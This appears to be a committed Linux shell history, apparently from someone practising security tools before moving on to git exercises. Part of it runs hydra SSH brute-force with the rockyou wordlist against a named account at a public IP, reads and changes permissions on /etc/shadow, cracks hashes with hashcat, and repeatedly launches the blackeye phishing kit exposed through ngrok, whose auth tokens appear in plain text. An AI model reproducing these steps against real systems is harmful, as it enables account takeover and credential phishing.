@@ -1,0 +1,466 @@
+    1  nano jt22
+    2  nano jt22
+    3  touch jt22 
+    4  nano jt22
+    5  python3 jt22.py
+    6  python jt22.txt
+    7  touch jt22.py
+    8  nano jt22.py
+    9  python jt22.py
+   10  python3 jt22.py
+   11  cls
+   12  exit
+   13  sudo
+   14  ip cocnfig
+   15  ip config
+   16  ip 
+   17  exit
+   18  sudo
+   19  sudo -h
+   20  sudo -s 
+   21  pwd
+   22  is
+   23  ls
+   24  macchanger
+   25  macchanger --help
+   26  ifconfig
+   27  apt update
+   28  exit
+   29  sr
+   30  ipconfig
+   31  exit
+   32  cd / usr/share/wordlists
+   33  sudo hydra
+   34  exit
+   35  cd /usr/share/wordlists
+   36  ls
+   37  sudo gzip -d rockyou.txt.gz
+   38  cat rockyou.txt.gz
+   39  cat rockyou.txt
+   40  cat wordlist.txt
+   41  touch password1.txt
+   42  touch pss.txt
+   43  touch pss.tx
+   44  touch pss.txt
+   45  nano pss.txt
+   46  cat pss.txt
+   47  sudo hydra -L "dwight.schrute" -P  pss.txt \\n45.79.49.74 ssh
+   48  sudo hydra -L "dwight.schrute" -P pss.txt
+   49  sudo hydra -L "dwight.schrute" -P pss.txt \\n45.79.49.74
+   50  cd /usr/share/wordlists
+   51  ls
+   52  cat rockyou.txt
+   53  sudo hydra -L "dwight.schrute" -P rockyou.txt  \\n45.79.49.74 ssh
+   54  exit
+   55  ipconfig
+   56  ssh dwight.schrute@45.79.49.74
+   57  sudo hydra -L "dwight.schrute" -P \\n45.79.49.74
+   58  sudo hydra =L "dwight.schrute" -P pss.txt \\n45.79.49.74
+   59  cat pss.txt
+   60  sudo hydra -l 'dwight.schrute"\n\nexit\n"dwight.schrute"
+   61  sudo hydra -l "dwight.schrute" -P pss.txt \ 
+   62  sudo hydra -l "dwight.schrute" -P pss.txt  \\n45.79.49.74 ssh
+   63  cat pss.txt
+   64  sudo hydra -l "dwight.schrute" -P rockyou.txt  \\n45.79.49.74 ssh 
+   65  cat rockyou.txt
+   66  cd /usr/share/wordlists
+   67  ls
+   68  sudo gzip -d rockyou.txt.gz
+   69  cat rockyou.tx
+   70  sudo gzip -d rockyou.txt.gz
+   71  cat rockyou.txt
+   72  exit
+   73  touch crackpasswords.txt
+   74  cat /etc/shadow
+   75  pwd
+   76  ls
+   77  cat etc/shadow
+   78  cat /etc/shadow
+   79  chmod 774 file 
+   80  chmod u=rwx,g=r,o=r shadow
+   81  chmod 774 etc
+   82  chmod 774 /etc/shadow
+   83  nano crackpasswords.txt
+   84  nano crackpasswords.txt
+   85  nano pss.txt
+   86  su -
+   87  su - 
+   88  sudo passwd root
+   89  cat /etc/shadow
+   90  sudo ipconfig 
+   91  sudo su
+   92  nano me.yxy
+   93  nano me.txt
+   94  sudo su
+   95  cat me.txt
+   96  cat m.txt
+   97  sudo hashcat -a 0 -m 1400 -o fhg.txt \\nm.txt me.txt
+   98  nano me.txt
+   99  sudo su
+  100  cat me.txt
+  101  cat m.txt
+  102  sudo hashcat -a 0 -m 1400 -o fhg.txt \\nm.txt me.txt
+  103  nano me.txt
+  104  sudo su
+  105  sudo clone blackeye
+  106  sudo clone https://github.com/An0nUD4Y/blackeye
+  107  sudo git clone https://github.com/An0nUD4Y/blackeye
+  108  cat m.txt
+  109  cat me.txt
+  110  sudo hashcat -a 0 -m 1400 -o cracks.txt\\nm.txt me.txt
+  111  m.txt
+  112  cat m.txt
+  113  sudo hashcat -a 0 -m 1400 -o crackedpasswords.txt  \\nm.txt me.txt
+  114  cat crackedpasswords.txt
+  115  sudo su
+  116  nano m.txt
+  117  sudo su
+  118  sudo hashcat -a 0 -m 1400 -o cvx.txt \\nm.txt pss.txt
+  119  cat me.txt
+  120  nano me.tx
+  121  nano me.txt
+  122  sudo su
+  123  cd blackeye
+  124  ls
+  125  sudo ./blackeye.sh
+  126  ./ngrok authtoken 1pLQCtwrxE9hVoGYKmg9sVVAEcc_9RnuNdeWuNTzqU75yL5N
+  127  cd /home/gaming
+  128  ls
+  129  sudo ./blackeye.sh
+  130  git clone https://github.com/An0nUD4Y/blackeye
+  131  cd blackeye
+  132  ls
+  133  ngrok
+  134  sudo ./blackeye.sh
+  135  cd
+  136  ls
+  137  unzip  ngrok-stable-linux-amd64.zip 
+  138  unzip /path/to/ngrok.zip
+  139  ./ngrok authtoken 1pLQCtwrxE9hVoGYKmg9sVVAEcc_9RnuNdeWuNTzqU75yL5N
+  140  cd blackeye
+  141  ls
+  142  sudo ./blackeye.sh
+  143  ./ngrok help
+  144  sudo ./blackeye.sh
+  145  ./ngrok http 80
+  146  sudo ./blackeye.sh
+  147  pwd
+  148  home
+  149  echo "https://baeldung.com" > data.txt
+  150  sha256sum data.txt 
+  151  touch m.txt
+  152  nano m.txt
+  153  sha256sum m.txt
+  154  nano m.txt
+  155  unzip /path/to/ngrok.zip
+  156  cd 
+  157  ls
+  158  cd /gaming/
+  159  cd /gaming
+  160  cd gaming/blackeye/
+  161  pwd
+  162  blackeye
+  163  pwd
+  164  exit
+  165  pwd
+  166  ls
+  167  sudo cp ngrok-stable-linux-amd64.zip blackeye
+  168  ls
+  169  blackeye
+  170  ls
+  171  exit
+  172  ls
+  173  sudo cp ngrok-stable-linux-amd64.zip blackeye
+  174  pwd
+  175  sudo cp ngrok-stable-linux-amd64.zip blackeye
+  176  pwd
+  177  blackeye
+  178  ls
+  179  blackeye
+  180  ./ngrok authtoken 1pLQCtwrxE9hVoGYKmg9sVVAEcc_9RnuNdeWuNTzqU75yL5N
+  181  sudo ./blackeye.sh
+  182  git clone  https://github.com/An0nUD4Y/blackeye
+  183  sudo su
+  184  -i
+  185  cp -i
+  186  cp -i ~/Downloads
+  187  cp -i ngrok-stable-linux-amd64.zip
+  188  cp -i /Downloads/
+  189  blackeye
+  190  ngrok
+  191  pwd
+  192  blackeye
+  193  cd blackeye
+  194  blackeye
+  195  ls
+  196  sites
+  197  ls
+  198  instagram
+  199  php -S localhost:8080
+  200  unzip /path/to/ngrok.zip
+  201  blackeye
+  202  ls
+  203  unzip ngrok-stable-linux-amd64.zip
+  204  sudo su
+  205  unzip /path/to/ngrok.zip
+  206  blackeye
+  207  ls
+  208  unzip ngrok-stable-linux-amd64.zip
+  209  sudo su
+  210  git clone https://github.com/An0nUD4Y/blackeye
+  211  rm -i ngrok
+  212  rm -i ngrok-stable-linux-amd64.zip
+  213  ow
+  214  pwd
+  215  cd blackeye
+  216  sudo cp ngrok-stable-linux-amd64.zip blackeye
+  217  pwd
+  218  blackeye
+  219  ls
+  220  sudo unzip ngrok-stable-linux-amd64.zip
+  221  ls
+  222  sudo unzip ngrok-stable-linux-amd64.zip
+  223  sudo ./blackeye.sh
+  224  sudo cp ngrok blackeye
+  225  sudo cp ngrok-2.3.35-linux-amd64.zip blackeye
+  226  ls
+  227  cd blackeye
+  228  ls
+  229  1pLcKv3T4PQmjIqNFRQdH7SPiHu_3Rjk9qTJyerano3tbG1wP
+  230  ./ngrok authtoken 1pLcKv3T4PQmjIqNFRQdH7SPiHu_3Rjk9qTJyerano3tbG1wP
+  231  sudo ./blackeye.sh
+  232  cd linkedin
+  233  ls
+  234  cd ./blackeye/sites/linkedin
+  235  cd sites/instagram
+  236  ls
+  237  cd login.php
+  238  ls
+  239  sudo cd login.html
+  240  cd login.html
+  241  ls
+  242  cd index_files
+  243  ls
+  244  cp ngrok blackeye
+  245  sudo cp ngrok blackeye
+  246  pwd
+  247  cd blackeye
+  248  ./ngrok authtoken 1pLcKv3T4PQmjIqNFRQdH7SPiHu_3Rjk9qTJyerano3tbG1wP
+  249  sudo ./blackeye.sh
+  250  rm -i ngrok
+  251  rm -i ngrok-2.3.35-linux-amd64.zip
+  252  sudo su
+  253  rm -i ngrok
+  254  rm -i ngrok-2.3.35-linux-amd64.zip
+  255  sudo su
+  256  sudo unzip ngrok-2.3.35-linux-amd64.zip
+  257  rm -r blackeye
+  258  exit
+  259  sudo rm -r blackeye
+  260  sudo rm -i ngrok
+  261  sudo rm -i ngrok-2.3.35-linux-amd64.zip
+  262  cat me.txt
+  263  man hashcat 
+  264  sudo hashcat -a 0 -m 1400 -o crackedpasswords.txt  \\nm.txt me.txt
+  265  sudo hashcat -a 0 -m 1400 -o cracked.txt --potfile-disable  \\nm.txt me.txt
+  266  cat m.txt
+  267  cat me.txt
+  268  nano me.txt
+  269  sudo nano me.txt
+  270  cat me/txt
+  271  cat me.txt
+  272  sudo hashcat -a 0 -m 1400 -o crackedpasswords.txt --potifile-disable \\n
+  273  sudo hashcat -a 0 -m 1400 -o crackedpasswords.txt --potfile-disable \\nm.txt me.txt
+  274  exit
+  275  sudo rm -i ngrok-stable-linux-amd64.zip
+  276  sudo rm -i blackeye
+  277  sudo install git clone
+  278  apt install git clone
+  279  sudo apt install git clone
+  280  sudo apt install git
+  281  git clone https://github.com/x3rz/blackeye
+  282  git clone https://github.com/thelinuxchoice/blackeye 
+  283  git clone https://github.com/An0nUD4Y/blackeye
+  284  git clone https://github.com/x3rz/blackeye
+  285  git clone https://github.com/An0nUD4Y/blackeye
+  286  cd blackeye
+  287  ls
+  288  sudo ./blackeye.sh
+  289  cat me.txt
+  290  pwd
+  291  cd gaming 
+  292  exit
+  293  cd blackeye
+  294  owd
+  295  pwd
+  296  exit
+  297  git clone ttps://github.com/x3rz/blackeye
+  298  git clone x
+  299  exit
+  300  ipconfig
+  301  sudo su
+  302  pw
+  303  pwd
+  304  sudo su
+  305  sudo su
+  306  rm -r blackeye
+  307  sudo rm -r blackeye
+  308  setoolkit
+  309  sudo setoolkit
+  310  sudo du
+  311  sudo su
+  312  sudo du
+  313  sudo su
+  314  ls
+  315  ./ngrok authtoken 1pLcKv3T4PQmjIqNFRQdH7SPiHu_3Rjk9qTJyerano3tbG1wP
+  316  sudo ./ngrok http 80
+  317  sudo cd /root
+  318  ./ngrok http 80
+  319  exit
+  320  pwd
+  321  cd blackeye
+  322  ./ngrok authtoken 1pLcKv3T4PQmjIqNFRQdH7SPiHu_3Rjk9qTJyerano3tbG1wP
+  323  sudo ./blackeye.sh
+  324  sudo git clone https://github.com/An0nUD4Y/blackeye
+  325  cd blackeye
+  326  ls
+  327  sudo ./blackeye.sh
+  328  sudo ./ngrok http 80
+  329  cd blackeye
+  330  sudo ./blackeye.sh
+  331  cd blackeye
+  332  ./ngrok authtoken 1pLcKv3T4PQmjIqNFRQdH7SPiHu_3Rjk9qTJyerano3tbG1wP
+  333  nano blackeye.sh
+  334  sudo nano blackeye.sh
+  335  sudo ./blackeye.sh
+  336  sudo /root
+  337  sudo cd /root
+  338  pwd
+  339  sudo su
+  340  cd blackeye
+  341  ./ngrok http 80
+  342  nano me.txt
+  343  y
+  344  cat me.txt
+  345  cat m.txt
+  346  sudo ud
+  347  sudo su
+  348  close
+  349  exit
+  350  python3
+  351  cat math.py
+  352  cat m.txt
+  353  exit
+  354  sudo su
+  355  xolse
+  356  close
+  357  cls
+  358  --help
+  359  exit --help
+  360  sudo su
+  361  cd ..
+  362  pwd
+  363  cd ..
+  364  cd..
+  365  cd ..
+  366  pwd
+  367  pwd 
+  368  cd ..
+  369  cd home
+  370  ls
+  371  cat gaming 
+  372  cd gaming 
+  373  ls
+  374  cat crackedpasswords.txt
+  375  sudo cat crackedpasswords.txt
+  376  cd root 
+  377  ls
+  378  cat crack.txt
+  379  sudo cat crack.txt
+  380  cd sherlock
+  381  ls
+  382  sudo su 
+  383  exit
+  384  sudo su
+  385  sudo pip install visual studio
+  386  la
+  387  ls
+  388  sudo dpkg -i code_1.60.0-1630494279_amd64.deb
+  389  \\ 
+  390  home
+  391  cd home/
+  392  cd home
+  393  bash Anaconda-latest-Linux-x86_64.sh
+  394  bash Anaconda-latest-Linux-x86_64.exe
+  395  bash Anaconda3-2021.05-Windows-x86_64.exe
+  396  clear
+  397  del Anaconda-latest-Linux-x86_64.exe
+  398  ls
+  399  bash Anaconda3-2021.05-Windows-x86_64.sh
+  400  bash Anaconda3-2021.05-Linux-x86_64.sh
+  401  sudo apt-get update
+  402  sudo apt-get install python3 python3-venv python3-pip
+  403  sudo dnf install python3
+  404  sudo install python3
+  405  python3 --version
+  406  cls
+  407  clear
+  408  touch hello_world.py
+  409  cat hello_world.py
+  410  print('hello world')
+  411  clear
+  412  sudo su
+  413  git push README.md
+  414  git init
+  415  sudo su 
+  416  git init
+  417  sudo su 
+  418  sudo su
+  419  sudo su
+  420  sudo su 
+  421  git init
+  422  ls -a
+  423  mkdir git-basic-exercises
+  424  ls -a
+  425  git  init
+  426  ls -a
+  427  touch README.md
+  428  ls -a
+  429  git status
+  430  git add
+  431  git status
+  432  git add README.md
+  433  git status
+  434  git commit -m 
+  435  git commit -m "initial commit"
+  436  git log
+  437  nano README.md
+  438  cat README.md
+  439  git status
+  440  git commit -m "second commit"
+  441  git log
+  442  git add README.md
+  443  git commit -m "second commit"
+  444  git log
+  445  git status
+  446  nano README.md
+  447  git add README.md
+  448  git commit -m "third commit"
+  449  git log
+  450  git status
+  451  git branch
+  452  git branch milkshake-flavours
+  453  git branch
+  454  git checkout milkshake-flavours
+  455  nano milkshakes.md
+  456  ls -a
+  457  git status
+  458  git add milkshakes.md
+  459  git commit -m "added initial flavours"
+  460  git log
+  461  clear
+  462  git checkout master
+  463  git branch history
+  464  git log
+  465  git branch
+  466  git checkout history
